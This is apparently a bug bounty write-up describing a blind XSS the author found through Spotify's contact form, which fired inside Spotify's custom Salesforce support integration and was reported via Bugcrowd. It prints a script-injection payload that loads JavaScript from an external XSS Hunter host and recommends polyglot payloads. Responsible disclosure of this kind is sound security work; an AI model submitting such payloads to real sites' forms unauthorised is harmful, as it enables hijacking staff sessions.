---
layout: post
title: Blind XSS in Spotify's Salesforce integration
---

This is the story of an XSS vulnerability I found in Spotify. It could have allowed me to hijack an employee’s session. But first some background.

**What are blind XSS vulnerabilities?**

Blind XSS vulnerabilities are usually persistent XSS. They occur when the attacker’s input is displayed on a page that he doesn’t have acces to. Like feedback or contact us pages.

**How would I know that my payload worked if I can’t see the page?**

Here comes [xss hunter](https://xsshunter.com/) to the rescue! It’s an awesome web app that Matthew Bryant [@IAmMandatory](https://twitter.com/IAmMandatory) built (kudos to him!). It helps a lot in the process of finding blind XSS vulnerabilities. It has a lot of [features](https://xsshunter.com/features) and it gave me the idea of this vulnerability.


Enough talking. Let’s go to the actual story.

Spotify had a contact page where a user can report problems or send suggestions. I sent a question with a very simple XSS payload.
{%highlight html%}
    "><script src=https://mhmdiaa.xss.ht></script>
{%endhighlight%}
After some minutes I got an email from XSS hunter saying that my payload fired! It fired in a Salesforce domain that Spotify used as a support platform. So I reported to Spotify’s team via bugcrowd and asked them to inform Salesforce about it. They replied that the XSS was on their own custom Salesforce integration and has nothing to do with Salesforce and they rewarded me with $750.


Note: When testing for blind XSS, always use polyglots (unless you're dealing with a WAF). You don't know where your payload will land.

I’d like to thank Spotify for the reward and for their cooperation, thank Matthew for the awesome xss hunter and thank bugcrowd for being such a great platform that got many companies into the world of crowd-sourced security.